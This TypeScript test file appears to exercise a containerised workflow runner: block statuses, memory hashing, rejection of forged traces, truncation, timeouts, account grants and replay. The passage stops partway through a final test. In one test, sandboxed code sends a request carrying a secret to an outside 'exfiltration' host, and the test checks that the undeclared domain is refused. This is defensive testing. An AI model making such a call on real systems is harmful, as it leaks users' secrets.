import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import dns from "node:dns";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { PassThrough } from "node:stream";
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { FakeBridge } from "../../src/mcp/fake-bridge.js";
import {
  RUN_DELAY_MS,
  MEMORY_GAP_MS,
  PUBLICATIONS_GAP_MS,
  MEMORY_NOT_KEPT,
  PROFILE_DENIED,
  runWorkflow,
  type WorkflowContext,
  type InfraWorkflow,
  type ProcessLauncher,
} from "../../src/workflows/run.js";
import { OUTPUT_MAX_BYTES } from "../../src/workflows/executions.js";
import { SEARCHES_CAP, SEARCHES_STOPPED, TOO_MANY_READS, fetch } from "../../src/workflows/access.js";
import { SEARCH_DENIED, UNREADABLE_RESULTS, extractResults, searchUrl } from "../../src/workflows/duckduckgo.js";
import { Pacing } from "../../src/workflows/pacing.js";
import { WEB_REQUIRED } from "../../src/workflows/validate.js";
import { LINE_MAX_BYTES, DATA_MAX_SIZE } from "../../src/workflows/protocol.js";
import { DATA_MAX_SIZE as HOME_DATA_MAX_SIZE } from "../../src/home/schemas.js";
import { REPLAY_TOO_BIG } from "../../src/workflows/replay.js";
import { paramsHash, type BlocksMemory } from "../../src/workflows/memory.js";
import { validateWorkflow } from "../../src/workflows/validate.js";
import { tempFolder } from "../helpers/temp.js";
import { Workshop } from "../../src/container/workshop.js";
import { spacePaths } from "../../src/paths.js";
import { streamingChain } from "../../src/workflows/chain.js";
import { ACTION_STOPPED } from "../../src/workflows/executions.js";
import type { Owner } from "../../src/workflows/schema.js";
import type { DirectTrace } from "../../src/workflows/run.js";

const ENGINE = join(import.meta.dirname, "..", "..", "docker", "engine");
const SCRIPT = join(ENGINE, "harvester.mjs");
const NOW = new Date("2026-10-29T10:00:00.000Z");

const toClose: { close(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(toClose.splice(0).map((s) => s.close()));
});

async function webServer(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requests: string[] = [];
  const s: Server = createServer((req, res) => {
    requests.push(req.url ?? "");
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const server = {
    port,
    url: `http://127.0.0.1:${port}`,
    requests: requests,
    close: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  toClose.push(server);
  return server;
}

const valid = (raw: unknown) => {
  const r = validateWorkflow(raw);
  if (!r.ok) throw new Error(r.error);
  return r.valid;
};

/** code (file `<id>.mjs`) → … → sortie, in a chain. */
const chain = (...ids: string[]) => ({
  version: 1,
  blocks: [...ids.map((id) => ({ id, type: "code", params: { source: `${id}.mjs` } })), { id: "sortie", type: "output", params: { to: "widget" } }],
  links: [...ids, "sortie"].slice(1).map((to, i) => ({ from: [...ids, "sortie"][i]!, to: to })),
});

/** The owner as the bench records it: a widget's id (as before), `action:<id>` for an action. */
const nameOf = (p: string | Owner) => (typeof p === "string" ? p : p.type === "widget" ? p.id : `action:${p.id}`);

interface Bench {
  ctx: WorkflowContext;
  infra: InfraWorkflow;
  commands: string[][];
  deleted: string[];
  killed: number;
  denialPending: number;
}

/** A widget (files in a temporary folder) and a launcher that runs the harvester locally, without docker. */
async function bench(
  workflow: unknown,
  files: Record<string, string> = {},
  o: { account?: string[]; public?: string[]; grant?: { profile: string } | null; bridge?: FakeBridge; memory?: BlocksMemory; delayMs?: number; launch?: ProcessLauncher } = {},
): Promise<Bench> {
  const folder = await tempFolder();
  for (const [name, content] of Object.entries(files)) await writeFile(join(folder, name), content);
  const b: Bench = {
    commands: [],
    deleted: [],
    killed: 0,
    denialPending: 0,
    ctx: {
      owner: { type: "widget", id: "essai" },
      valid: valid(workflow),
      filesFolder: folder,
      config: { interests: "rust" },
      previous: null,
      memory: o.memory ?? {},
      sources: { account: o.account ?? [], public: o.public ?? [] },
      grant: async () => (o.grant === undefined ? null : o.grant),
      onProfileDenied: async () => {
        b.denialPending++;
      },
      grantRequiredMessage: "Accord requis pour lire avec ton compte : app.daily.dev",
      trigger: "manual",
    },
    infra: {
      engine: ENGINE,
      workshop: {
        harvestCommand: (p, d, m) => ["docker", "run", nameOf(p), d, m],
        deleteHarvest: async (p) => {
          b.deleted.push(nameOf(p));
        },
      },
      launch:
        o.launch ??
        ((cmd, args) => {
          b.commands.push([cmd, ...args]);
          const e = spawn(process.execPath, [SCRIPT, folder], { stdio: ["pipe", "pipe", "pipe"] });
          return {
            stdin: e.stdin,
            stdout: e.stdout,
            stderr: e.stderr,
            kill: () => {
              b.killed++;
              e.kill("SIGKILL");
            },
            end: new Promise((ok) => e.on("close", (c) => ok(c))),
          };
        }),
      ai: null,
      bridge: o.bridge ?? new FakeBridge([], { active: null, allow: false, read: { pages: [] } }),
      clock: () => NOW,
      delayMs: o.delayMs,
      localAddresses: true,
    },
  };
  return b;
}

/** A fake process that writes these lines on stdout then exits with `code`. */
const scriptedLauncher = (lines: unknown[], code = 0): ProcessLauncher => () => {
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const stdin = new PassThrough();
  stdin.resume();
  const end = new Promise<number | null>((ok) => {
    setImmediate(() => {
      for (const l of lines) stdout.write((typeof l === "string" ? l : JSON.stringify(l)) + "\n");
      stdout.end();
      stderr.end();
      setImmediate(() => ok(code));
    });
  });
  return { stdin, stdout, stderr, kill: () => {}, end: end };
};

describe("executerWorkflow", () => {
  it("a code → sortie workflow returns fin with the value and a successful run block by block", async () => {
    const b = await bench(chain("a"), {
      "a.mjs": `export default async (entree, w) => { w.log("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [{ x: 1 }, { x: 2 }, { interests: "rust" }] }, memory: {} });
    expect(r.run).toMatchObject({
      version: 1,
      id: "2026-10-29T10-00-00-000Z",
      owner: { type: "widget", id: "essai" },
      trigger: "manual",
      start: NOW.toISOString(),
      end: NOW.toISOString(),
      status: "succeeded",
    });
    expect(r.run.error).toBeUndefined();
    expect(r.run.blocks).toEqual([
      { id: "a", type: "code", status: "succeeded", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: ["bonjour 2"] },
      { id: "sortie", type: "output", status: "succeeded", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: [] },
    ]);
    // The global log keeps what the code writes (stderr), as before workflows.
    expect(r.log).toContain("bonjour 2");
    expect(b.commands[0]).toEqual(["docker", "run", "essai", b.ctx.filesFolder, ENGINE]);
    expect(b.deleted).toEqual(["essai"]);
  });

  it("a container of the same name left by an abrupt stop is removed before launch", async () => {
    const b = await bench(chain("a"), { "a.mjs": `export default () => 1;` });
    const launch = b.infra.launch!;
    let before: string[] = [];
    b.infra.launch = (cmd, args) => ((before = [...b.deleted]), launch(cmd, args));
    await runWorkflow(b.ctx, b.infra);
    expect(before).toEqual(["essai"]);
  });

  it("a partial block gives a partial run", async () => {
    const web = await webServer({ "/a": (res) => res.end("contenu a") });
    const b = await bench(
      {
        version: 1,
        blocks: [
          { id: "liste", type: "code", params: { source: "liste.mjs" } },
          { id: "lire", type: "source.fetch", params: { url: "{url}", perItem: true } },
          { id: "sortie", type: "output", params: { to: "widget" } },
        ],
        links: [{ from: "liste", to: "lire" }, { from: "lire", to: "sortie" }],
      },
      { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue.t).toBe("end");
    expect(r.run.status).toBe("partial");
    expect(r.run.blocks.map((x) => x.status)).toEqual(["succeeded", "partial", "succeeded"]);
    expect(r.run.blocks[1]!.output).toEqual([{ url: `${web.url}/a`, content: "contenu a" }, { url: `${web.url}/absente` }]);
    expect(r.run.blocks[1]!.log.join("\n")).toMatch(/404/);
  });

  it("a failed block: outcome echec, failed run, following blocks pas-lance", async () => {
    const b = await bench(chain("a", "b"), {
      "a.mjs": `export default async () => { throw new Error("cassé : x"); };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "failure", error: "cassé : x", codeError: true });
    expect(r.run.status).toBe("failed");
    expect(r.run.error).toBe("cassé : x");
    expect(r.run.kernelError).toBeUndefined();
    expect(r.run.blocks).toEqual([
      { id: "a", type: "code", status: "failed", start: NOW.toISOString(), end: NOW.toISOString(), items: null, error: "cassé : x", log: [] },
      { id: "b", type: "code", status: "not-run", start: null, end: null, items: null, log: [] },
      { id: "sortie", type: "output", status: "not-run", start: null, end: null, items: null, log: [] },
    ]);
  });

  it("the memory sent by the container comes back in the fin outcome", async () => {
    const workflow = {
      version: 1,
      blocks: [
        { id: "liste", type: "code", params: { source: "liste.mjs" } },
        { id: "nouveaux", type: "list.new", params: { key: "url" } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [{ from: "liste", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
    };
    const files = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
    const first = await bench(workflow, files);
    const r1 = await runWorkflow(first.ctx, first.infra);
    expect(r1.issue.t === "end" && r1.issue.output.value).toEqual([{ url: "a" }, { url: "b" }]);
    const memory = r1.issue.t === "end" ? r1.issue.memory : null;
    expect(memory?.nouveaux?.type).toBe("list.new");

    // The memory is sent back to the container: nothing new next time. An entry of another block does not pass.
    const second = await bench(workflow, files, { memory: { ...memory!, elsewhere: { type: "list.new", value: [] } } });
    const r2 = await runWorkflow(second.ctx, second.infra);
    expect(r2.issue.t === "end" && r2.issue.output.value).toEqual([]);
    expect(r2.issue.t === "end" && Object.keys(r2.issue.memory ?? {})).toEqual(["nouveaux"]);
  });

  it("a trace for an unknown or malformed block is ignored", async () => {
    const b = await bench(chain("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "block", id: "inconnu", step: "start" });
        l({ t: "block", id: "inconnu", step: "end", status: "succeeded", sortie: 1 });
        l({ t: "log", block: "inconnu", text: "x" });
        l({ t: "block", id: "sortie", step: "end", status: "bizarre" });
        l({ t: "block", id: "sortie", step: "end", status: "succeeded", output: "forgée" });
        process.stdout.write("pas du json\\n");
        return 1;
      };`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: 1 } });
    expect(r.run.blocks.map((x) => x.id)).toEqual(["a", "sortie"]);
    expect(r.run.blocks[1]).toMatchObject({ status: "succeeded", output: 1 });
  });

  it("a forged trace for a block that is not the next one does not count", async () => {
    const b = await bench(chain("a", "b"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "block", id: "b", step: "start" });
        l({ t: "block", id: "b", step: "end", status: "succeeded", output: "forgée" });
        throw new Error("cassé");
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "failure", error: "cassé" });
    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run", "not-run"]);
    expect(r.run.blocks[1]!.output).toBeUndefined();
  });

  it("forged memory: only the workflow's blocks with their type, the last line before fin counts", async () => {
    const workflow = {
      version: 1,
      blocks: [
        { id: "amont", type: "code", params: { source: "amont.mjs" } },
        { id: "nouveaux", type: "list.new", params: { key: "url" } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [{ from: "amont", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
    };
    const b = await bench(workflow, {}, {
      launch: scriptedLauncher([
        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["premiere"] } } },
        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["x"] }, other: { type: "list.new", value: 1 }, output: { type: "code", value: 2 } } },
        { t: "memory", memory: "pas un objet" },
        { t: "end", data: [] },
        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["après fin"] } } },
      ]),
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [] }, memory: { nouveaux: { type: "list.new", value: ["x"], hash: paramsHash({ key: "url" }) } } });
    // No block trace received: a block never started stays pas-lance.
    expect(r.run.blocks.map((x) => x.status)).toEqual(["not-run", "not-run", "not-run"]);
  });

  it("a memory over 3 MB is dropped with a note in the log", async () => {
    const b = await bench({ version: 1, blocks: [{ id: "amont", type: "code", params: { source: "amont.mjs" } }, { id: "nouveaux", type: "list.new", params: { key: "url" } }, { id: "sortie", type: "output" , params: { to: "widget" } }], links: [{ from: "amont", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }] }, {}, {
      launch: scriptedLauncher([
        { t: "memory", memory: { nouveaux: { type: "list.new", value: "x".repeat(3.5 * 1024 * 1024) } } },
        { t: "end", data: 1 },
      ]),
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", memory: null });
    expect(r.log).toContain(MEMORY_NOT_KEPT);
    // Also in the run, in the output block's log.
    expect(r.run.blocks.find((x) => x.id === "sortie")!.log).toEqual([MEMORY_NOT_KEPT]);
  });

  it("a trace of a started block without an end gives it failed; block log bounded to 200 lines of 500 characters", async () => {
    const b = await bench(chain("a"), {}, {
      launch: scriptedLauncher([
        { t: "block", id: "a", step: "start" },
        ...Array.from({ length: 250 }, (_, i) => ({ t: "log", block: "a", text: `${i} ${"y".repeat(800)}` })),
        { t: "failure", error: "arrêt" },
      ], 1),
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "failure", error: "arrêt", codeError: true });
    const a = r.run.blocks[0]!;
    expect(a.status).toBe("failed");
    expect(a.log).toHaveLength(200);
    expect(a.log[0]).toMatch(/51 lignes coupées/);
    expect(a.log[199]!.startsWith("249 ")).toBe(true);
    expect(a.log.every((l) => l.length <= 500)).toBe(true);
    expect(r.run.blocks[1]!.status).toBe("not-run");
  });

  it("a 5 MB output (huge page) arrives truncated and marked, without stopping the run", async () => {
    const b = await bench(chain("enorme", "moyenne", "court"), {
      "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
      "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
      "court.mjs": `export default async (e) => ({ length: e.length });`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: { length: 1024 * 1024 } } });
    expect(r.run.status).toBe("succeeded");
    const [huge, medium, short] = r.run.blocks;
    expect(huge).toMatchObject({ status: "succeeded", outputTruncated: true });
    expect(huge!.output).toBeUndefined();
    expect(medium).toMatchObject({ status: "succeeded", outputTruncated: true });
    expect(typeof medium!.output).toBe("string");
    expect(Buffer.byteLength(medium!.output as string)).toBeLessThanOrEqual(OUTPUT_MAX_BYTES);
    expect((medium!.output as string).startsWith('"xxx')).toBe(true);
    expect(short).toMatchObject({ status: "succeeded", output: { length: 1024 * 1024 } });
    expect(short!.outputTruncated).toBeUndefined();
  });

  it("lirePage with an account without a grant: accord-requis stop", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [] } });
    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.readPage("https://app.daily.dev/", { account: true });` }, { account: ["app.daily.dev"], grant: null, bridge: bridge });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "stop", status: "grant-required", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.run).toMatchObject({ status: "grant-required", error: "Accord requis pour lire avec ton compte : app.daily.dev", kernelError: true });
    expect(r.run.blocks[0]!.status).toBe("failed");
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(0);
    expect(b.deleted).toEqual(["essai", "essai"]);
  });

  it("ProfileDenied: onProfileDenied called, PROFILE_DENIED stop", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [], deny: ["perso"] } });
    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.readPage("https://app.daily.dev/", { account: true });` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(b.denialPending).toBe(1);
    expect(r.issue).toEqual({ t: "stop", status: "grant-required", error: PROFILE_DENIED });
    expect(r.run.status).toBe("grant-required");
  });

  it("an early fin written by the code: partial run, following blocks pas-lance", async () => {
    const b = await bench(chain("a", "b"), {
      "a.mjs": `export default async () => {
        process.stdout.write(JSON.stringify({ t: "end", data: "tôt" }) + "\\n");
        await new Promise((ok) => setTimeout(ok, 50));
        process.exit(0);
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: "tôt" } });
    expect(r.run.status).toBe("partial");
    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run", "not-run"]);
  });

  it("grant removed between two reads with an account: accord-requis stop, no second read", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://app.daily.dev/", title: "Fil", text: "articles", links: [] }] } });
    const b = await bench(
      chain("a"),
      { "a.mjs": `export default async (e, w) => { await w.readPage("https://app.daily.dev/", { account: true }); return w.readPage("https://app.daily.dev/", { account: true }); };` },
      { account: ["app.daily.dev"], bridge: bridge },
    );
    let reads = 0;
    b.ctx.grant = async () => (reads++ === 0 ? { profile: "perso" } : null);
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "stop", status: "grant-required", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.run.status).toBe("grant-required");
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(1);
    expect(b.deleted).toEqual(["essai", "essai"]);
  });

  it("lirePage with an account and a grant: the bridge receives the profile and the declared domains", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://app.daily.dev/", title: "Fil", text: "articles", links: [] }] } });
    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.readPage("https://app.daily.dev/", { account: true })).text;` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: "articles" } });
    expect(bridge.calls.find((a) => a.method === "readPageInvisible")!.args).toEqual(["https://app.daily.dev/", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true }]);
  });

  it("lirePage with defiler: the bridge receives it (with or without an account); 0 passes nothing; outside 0 to 20, refused", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [] } });
    const b = await bench(
      chain("a"),
      {
        "a.mjs": `const essai = (p) => p.then(() => "ok", (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.readPage("https://app.daily.dev/a", { scroll: 8 })),
          await essai(w.readPage("https://app.daily.dev/b", { account: true, scroll: 2 })),
          await essai(w.readPage("https://app.daily.dev/c", { scroll: 0 })),
          await essai(w.readPage("https://app.daily.dev/d", { scroll: 21 })),
        ];`,
      },
      { account: ["app.daily.dev"], public: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: ["ok", "ok", "ok", "refus: Arguments invalides pour readPage"] } });
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible").map((a) => a.args)).toEqual([
      ["https://app.daily.dev/a", { profile: null, domains: ["app.daily.dev"], localAddresses: true, scroll: 8 }],
      ["https://app.daily.dev/b", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true, scroll: 2 }],
      ["https://app.daily.dev/c", { profile: null, domains: ["app.daily.dev"], localAddresses: true }],
    ]);
  });

  it("recuperer to an undeclared domain for an owner with an account: refused", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [] } });
    const b = await bench(
      chain("a"),
      {
        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.fetch("https://exfiltration.fr/?d=secret")),
          await essai(w.fetch("http://localhost:${web.port}/")),
          await essai(w.readPage("https://exfiltration.fr/")),
          await essai(w.fetch("${web.url}/")),
        ];`,
      },
      { account: ["app.daily.dev"], public: ["127.0.0.1"], grant: { profile: "perso" }, bridge: bridge },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    const [external, otherName, page, declare] = (r.issue.t === "end" ? r.issue.output.value : []) as string[];
    expect(external).toMatch(/^refus: .*non déclaré/);
    expect(otherName).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requests).toHaveLength(1);
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(0);
  });

  it("timeout exceeded: in-flight AI calls are abandoned", async () => {
    const b = await bench(chain("a"), { "a.mjs": `export default (e, w) => Promise.all([w.kev("s", {}), w.gemma("p")]);` }, { delayMs: 600 });
    const signals: (AbortSignal | undefined)[] = [];
    b.infra.ai = {
      kev: (_c, o) => (signals.push(o?.signal), new Promise(() => {})),
      gemma: (g) => (signals.push(g.signal), new Promise(() => {})),
    };
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "stop", error: "Délai dépassé" });
    expect(signals).toHaveLength(2);
    expect(signals.every((s) => s?.aborted)).toBe(true);
  });

  it("timeout exceeded: « Délai dépassé » stop and container removed", async () => {
    const b = await bench(chain("a"), { "a.mjs": `export default () => new Promise(() => {});` }, { delayMs: 600 });
    const start = Date.now();
    const r = await runWorkflow(b.ctx, b.infra);
    expect(Date.now() - start).toBeLessThan(5000);
    expect(r.issue).toEqual({ t: "stop", status: "error", error: "Délai dépassé" });
    expect(r.run).toMatchObject({ status: "failed", error: "Délai dépassé", kernelError: true });
    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run"]);
    expect(b.killed).toBeGreaterThan(0);
    expect(b.deleted).toEqual(["essai", "essai"]);
    expect(RUN_DELAY_MS).toBe(200_000);
  });

  it("the debut carries the validated workflow and the config; the memory follows", async () => {
    const received: string[] = [];
    const b = await bench(chain("a"), {}, {
      launch: () => {
        const p = scriptedLauncher([{ t: "end", data: null }])("", []);
        p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
        return p;
      },
      memory: { a: { type: "code", value: 1 } },
    });
    b.ctx.previous = { old: true };
    await runWorkflow(b.ctx, b.infra);
    const lines = received.join("").trim().split("\n").map((l) => JSON.parse(l));
    expect(lines[0]).toEqual({
      t: "start",
      previous: { old: true },
      now: NOW.toISOString(),
      config: { interests: "rust" },
      workflow: { blocks: b.ctx.valid.workflow.blocks, links: b.ctx.valid.workflow.links, order: ["a", "sortie"] },
    });
    expect(lines[1]).toEqual({ t: "memory", memory: { a: { type: "code", value: 1 } } });
  });

  /** The lines the container receives (start, memory) and the returned memory, for a workflow `a` → `sortie`. */
  async function memoryViewedByContainer(workflow: unknown, memory: BlocksMemory, rendered: BlocksMemory = {}) {
    const received: string[] = [];
    const b = await bench(workflow, {}, {
      launch: () => {
        const p = scriptedLauncher([{ t: "memory", memory: rendered }, { t: "end", data: null }])("", []);
        p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
        return p;
      },
      memory: memory,
    });
    const r = await runWorkflow(b.ctx, b.infra);
    const lines = received.join("").trim().split("\n").map((l) => JSON.parse(l));
    return { sent: lines[1].memory as BlocksMemory, rendered: r.issue.t === "end" ? r.issue.memory : null, ctx: b.ctx };
  }

  it("a memory whose hash no longer matches the parameters is not sent to the container", async () => {
    const wf = (key: string) => ({
      version: 1,
      blocks: [
        { id: "a", type: "code", params: { source: "a.mjs" } },
        { id: "n", type: "list.new", params: { key: key } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [{ from: "a", to: "n" }, { from: "n", to: "sortie" }],
    });
    const memory: BlocksMemory = {
      n: { type: "list.new", value: ["x"], hash: paramsHash({ key: "url" }) },
      a: { type: "code", value: 1 }, // old memory without a hash: accepted once
    };
    const same = await memoryViewedByContainer(wf("url"), memory);
    expect(same.sent).toEqual({ n: { type: "list.new", value: ["x"] }, a: { type: "code", value: 1 } }); // without the hash
    const others = await memoryViewedByContainer(wf("titre"), memory);
    expect(others.sent).toEqual({ a: { type: "code", value: 1 } });
  });

  it("the returned memory is marked with the hash of the run's parameters, even if workflow.json changed meanwhile", async () => {
    // The run never reads workflow.json: it receives ctx.valide, validated at the start. A file rewritten during
    // the run therefore changes nothing about what is marked; the new settings do not find this memory.
    const wf = (key: string) => ({
      version: 1,
      blocks: [
        { id: "a", type: "code", params: { source: "a.mjs" } },
        { id: "n", type: "list.new", params: { key: key } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [{ from: "a", to: "n" }, { from: "n", to: "sortie" }],
    });
    const first = await memoryViewedByContainer(wf("url"), {}, { n: { type: "list.new", value: ["vu"] } });
    expect(first.rendered).toEqual({ n: { type: "list.new", value: ["vu"], hash: paramsHash({ key: "url" }) } });
    // workflow.json changed (cle: titre): the second run receives an empty memory for this block.
    const second = await memoryViewedByContainer(wf("titre"), first.rendered!);
    expect(second.sent).toEqual({});
  });

  describe("trials (replay from a block)", () => {
    const T = NOW.toISOString();
    /** a → b → c → sortie: replay from c, b reused (2 elements), a neither relaunched nor reused. */
    const replayFromC = { reruns: ["c", "sortie"], outputs: { b: [{ x: 1 }, { x: 2 }] }, resumed: { b: 2 } };

    it("a trial returns a run with repris, pas-lance and the relaunched blocks", async () => {
      const b = await bench(chain("a", "b", "c"), {
        "a.mjs": `export default async () => { throw new Error("a lancé"); };`,
        "b.mjs": `export default async () => { throw new Error("b lancé"); };`,
        "c.mjs": `export default async (entree) => entree.map((e) => e.x * 10);`,
      });
      b.ctx.trigger = "replay";
      b.ctx.replay = replayFromC;
      const r = await runWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [10, 20] }, memory: null });
      expect(r.run.status).toBe("succeeded");
      expect(r.run.trigger).toBe("replay");
      expect(r.run.blocks).toEqual([
        { id: "a", type: "code", status: "not-run", start: null, end: null, items: null, log: [] },
        { id: "b", type: "code", status: "resumed", start: null, end: null, items: 2, log: [] },
        { id: "c", type: "code", status: "succeeded", start: T, end: T, items: 2, output: [10, 20], log: [] },
        { id: "sortie", type: "output", status: "succeeded", start: T, end: T, items: 2, output: [10, 20], log: [] },
      ]);
    });

    it("a trial: the status counts only the relaunched blocks, and lines forged for a reused or non-relaunched block are rejected", async () => {
      const b = await bench(chain("a", "b", "c"), {}, {
        launch: scriptedLauncher([
          { t: "block", id: "b", step: "start" },
          { t: "log", block: "b", text: "forgé" },
          { t: "block", id: "b", step: "end", status: "succeeded", output: "forgée" },
          { t: "log", block: "a", text: "forgé" },
          { t: "block", id: "c", step: "start" },
          { t: "block", id: "c", step: "end", status: "succeeded", output: [1] },
          { t: "block", id: "a", step: "start" },
          { t: "block", id: "sortie", step: "start" },
          { t: "block", id: "sortie", step: "end", status: "succeeded", output: [1] },
          { t: "end", data: [1] },
        ]),
      });
      b.ctx.replay = replayFromC;
      const relayed: unknown[] = [];
      b.infra.onTrace = (t) => relayed.push(t);
      const r = await runWorkflow(b.ctx, b.infra);
      expect(r.run.status).toBe("succeeded");
      expect(r.run.blocks.map((x) => [x.id, x.status])).toEqual([["a", "not-run"], ["b", "resumed"], ["c", "succeeded"], ["sortie", "succeeded"]]);
      expect(r.run.blocks[0]!.log).toEqual([]);
      expect(r.run.blocks[1]).toMatchObject({ items: 2, log: [], start: null });
      expect(r.run.blocks[1]!.output).toBeUndefined();
      expect(relayed.map((t: any) => `${t.step}:${t.block}`)).toEqual(["start:c", "end:c", "start:sortie", "end:sortie"]);
    });

    it("a trial sends no memory and returns none", async () => {
      const received: string[] = [];
      const b = await bench(chain("a", "b", "c"), {}, {
        launch: () => {
          const p = scriptedLauncher([{ t: "memory", memory: { c: { type: "code", value: "forgée" } } }, { t: "end", data: null }])("", []);
          p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
          return p;
        },
        memory: { a: { type: "code", value: 1 }, c: { type: "code", value: 2 } },
      });
      b.ctx.replay = replayFromC;
      const r = await runWorkflow(b.ctx, b.infra);
      const lines = received.join("").trim().split("\n").map((l) => JSON.parse(l));
      expect(lines[0].replay).toEqual({ reruns: ["c", "sortie"], outputs: { b: [{ x: 1 }, { x: 2 }] } });
      expect(lines[1]).toEqual({ t: "memory", memory: {} });
      expect(r.issue).toMatchObject({ t: "end", memory: null });
    });

    it("outputs to reuse of over 4 MB stop the trial without launching a container", async () => {
      const b = await bench(chain("a", "b", "c"));
      b.ctx.replay = { ...replayFromC, outputs: { b: "x".repeat(LINE_MAX_BYTES) } };
      const r = await runWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "stop", status: "error", error: REPLAY_TOO_BIG });
      expect(REPLAY_TOO_BIG).toBe("Rejeu impossible : les sorties à reprendre dépassent 4 Mo");
      expect(b.commands).toEqual([]);
      expect(r.run).toMatchObject({ status: "failed", error: REPLAY_TOO_BIG, kernelError: true });
    });
  });

  it("surTrace receives debut then fin of each block, with elements; a fake out-of-order trace is not relayed", async () => {
    const b = await bench(chain("a"), {
